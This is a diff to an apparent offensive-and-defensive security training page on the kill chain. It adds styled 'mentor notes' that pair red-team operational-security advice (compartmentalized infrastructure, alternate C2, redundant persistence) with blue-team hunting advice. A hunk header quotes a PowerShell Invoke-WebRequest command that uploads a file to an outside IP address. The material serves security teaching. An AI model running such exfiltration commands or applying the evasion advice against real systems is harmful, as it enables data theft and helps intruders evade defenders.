@@ -345,6 +345,46 @@
             margin: 1rem 0;
         }
         .ttp-mapping h5 { color: var(--amber); margin-bottom: 0.5rem; }
+        .mentor-box {
+            border: 2px solid var(--neon);
+            padding: 1.5rem;
+            margin: 1.5rem 0;
+            position: relative;
+            background: #0a0a0a;
+            border-radius: 8px;
+        }
+        .mentor-box::before {
+            content: 'MENTOR NOTE — asi dev [HTB]';
+            position: absolute;
+            top: -14px;
+            left: 20px;
+            background: var(--bg);
+            color: var(--neon);
+            font-family: Consolas, monospace;
+            font-size: 0.7rem;
+            padding: 0 10px;
+            letter-spacing: 0.1em;
+        }
+        .mentor-quote {
+            font-family: Consolas, monospace;
+            color: var(--neon);
+            font-size: 1.05rem;
+            margin-bottom: 0.75rem;
+            text-shadow: 0 0 5px rgba(0,255,255,0.2);
+        }
+        .mentor-box p { color: #ccc; margin-bottom: 0.6rem; }
+        .mentor-box .team-note {
+            border-left: 3px solid var(--accent);
+            padding-left: 0.75rem;
+            margin-top: 0.75rem;
+        }
+        .mentor-box .team-note.red { border-left-color: var(--accent); }
+        .mentor-box .team-note.blue { border-left-color: #0088ff; }
+        .mentor-box .team-note strong {
+            font-family: Consolas, monospace;
+            text-transform: uppercase;
+            font-size: 0.8rem;
+        }
     </style>
 </head>
 <body>
@@ -369,6 +409,13 @@
         <div class="layman-term">
             <h4>🎯 Soldier Translation</h4>
             <p>This is the full mission: reconnaissance, infiltration, escalation, persistence, lateral movement, and exfiltration. Every technique from previous modules, chained together in sequence. You are the special forces team. The target is the enterprise. The objective is total access. But now you also man the guard tower — you build the alarms, write the detection rules, and train the defenders to catch the next attacker.</p>
+        </div>
+
+        <div class="mentor-box">
+            <div class="mentor-quote">"A chain is only as strong as its most secret link."</div>
+            <p>The whole kill chain depends on the part the defender cannot see. Recon reveals the surface, but the weakest link is usually something hidden in plain sight: a reused password, an unmonitored share, a forgotten service account, or a staging directory no one checks. Find that link before the blue team does.</p>
+            <div class="team-note red"><strong>Red team:</strong> Invest effort in finding the unmonitored edge — shadow IT, stale accounts, and non-standard ports. One secret link grants the whole chain.</div>
+            <div class="team-note blue"><strong>Blue team:</strong> You cannot defend what you cannot see. Asset inventory, credential hygiene, and broad telemetry are how you harden the secret links.</div>
         </div>
 
         <h2>📚 Prerequisites — Cross-Linked to All Previous Modules</h2>
@@ -614,6 +661,13 @@
                 </div>
                 <span class="status">✅ LIVE</span>
             </div>
+        </div>
+
+        <div class="mentor-box">
+            <div class="mentor-quote">"If one link burns, the rest stay secret."</div>
+            <p>A well-built chain is modular. Each phase is isolated from the others by design: separate infrastructure, separate credentials, separate tooling. If recon is caught, the payload is still unknown. If the payload is caught, the C2 infrastructure is still clean. Compartmentalization is not paranoia — it is survival.</p>
+            <div class="team-note red"><strong>Red team:</strong> Use different infrastructure, credentials, and tools for each phase. Never let one burned operation expose the rest of the chain.</div>
+            <div class="team-note blue"><strong>Blue team:</strong> Assume a single detection will not stop the adversary. Correlate across phases and hunt for the next link instead of declaring victory after one alert.</div>
         </div>
 
         <h2>🔬 Phase-by-Phase: TTP Mapping, Detection, and Defense</h2>
@@ -975,6 +1029,13 @@ Invoke-WebRequest -Uri "http://192.168.1.92:8080/upload" -Method POST -InFile "C
             <h3>What is Purple Teaming?</h3>
             <p><span class="neon-purple">Purple teaming</span> is the practice of combining red team (offensive) and blue team (defensive) operations to improve overall security posture. Unlike red team exercises that test detection, or blue team monitoring that waits for alerts, purple teaming is a collaborative exercise where attackers and defenders work together in real time.</p>
             <p style="margin-top: 1rem;"><strong>The goal:</strong> Not just to find vulnerabilities, but to validate that your detection and response capabilities actually work when an attack occurs. Every technique in this module should be tested with a corresponding detection rule.</p>
+        </div>
+
+        <div class="mentor-box">
+            <div class="mentor-quote">"Nation-states use chains because they can burn links."</div>
+            <p>Advanced adversaries do not rely on a single exploit or one clean path. They build redundant chains so that when a domain is seized, a payload is detected, or an operator is burned, the mission continues. The ability to discard a link without losing the chain is what separates amateurs from professionals — and criminals from nation-states.</p>
+            <div class="team-note red"><strong>Red team:</strong> Build fallback paths. Stage alternate C2, pre-position multiple persistence mechanisms, and keep clean infrastructure in reserve. Your chain should survive a burned domain.</div>
+            <div class="team-note blue"><strong>Blue team:</strong> One takedown is never enough. After evicting an adversary, hunt for the backup persistence and alternate channels they left behind. Burned links often reveal new ones.</div>
         </div>
 
         <table>
